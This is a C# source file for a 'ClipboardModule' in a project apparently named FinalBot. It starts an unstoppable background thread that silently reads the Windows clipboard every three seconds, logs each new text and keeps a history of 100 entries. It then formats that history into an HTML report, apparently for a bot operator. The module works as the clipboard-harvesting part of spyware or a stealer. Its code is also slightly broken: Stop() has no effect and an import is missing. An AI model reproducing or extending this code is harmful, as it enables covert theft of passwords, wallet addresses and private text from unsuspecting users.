using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace FinalBot.Modules
{
    public static class ClipboardModule
    {
        [DllImport("user32.dll")] static extern bool OpenClipboard(IntPtr hWnd);
        [DllImport("user32.dll")] static extern bool CloseClipboard();
        [DllImport("user32.dll")] static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("kernel32.dll")] static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")] static extern bool GlobalUnlock(IntPtr hMem);

        private const uint CF_UNICODETEXT = 13;
        private static bool _isMonitoring = false; // This field is no longer used by Start(), but kept as per instruction context.
        private static string _lastText = "";
        private static List<string> _history = new List<string>();
        private static readonly object _lock = new object();

        public static void Start()
        {
            // The _isMonitoring check and assignment are removed as per the new Start() logic.
            // The new Start() method starts a thread that runs indefinitely.
            new Thread(() =>
            {
                // Logger.Info("Clipboard Monitor Started"); // This line is removed as per the new Start() logic.
                while (true) // The loop now runs indefinitely.
                {
                    try
                    {
                        string currentText = GetClipboardText();
                        if (!string.IsNullOrEmpty(currentText) && currentText != _lastText)
                        {
                            _lastText = currentText;
                            lock (_lock)
                            {
                                _history.Add(currentText);
                                if (_history.Count > 100) _history.RemoveAt(0);
                            }
                            Logger.Log($"[CLIPBOARD] {currentText}");
                        }
                    }
                    catch { } // Added try-catch block around the monitoring logic.
                    Thread.Sleep(3000); // Poll every 3 seconds
                }
            }) { IsBackground = true }.Start();
        }

        public static string GetSummary()
        {
            lock (_lock)
            {
                if (_history.Count == 0) return "📋 <i>Clipboard history is empty.</i>";
                return string.Join("\n\n\n\n\n", _history);
            }
        }

        public static void Stop()
        {
            _isMonitoring = false;
        }

        public static string GetClipboardText()
        {
            try
            {
                string result = "";
                var t = new Thread(() =>
                {
                    try
                    {
                        if (!OpenClipboard(IntPtr.Zero)) return;
                        IntPtr handle = GetClipboardData(CF_UNICODETEXT);
                        if (handle == IntPtr.Zero) { CloseClipboard(); return; }
                        IntPtr ptr = GlobalLock(handle);
                        if (ptr != IntPtr.Zero)
                        {
                            result = Marshal.PtrToStringUni(ptr) ?? "";
                            GlobalUnlock(handle);
                        }
                        CloseClipboard();
                    }
                    catch { }
                });
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
                t.Join(1000); // 1s timeout
                return result;
            }
            catch { return ""; }
        }
    }
}
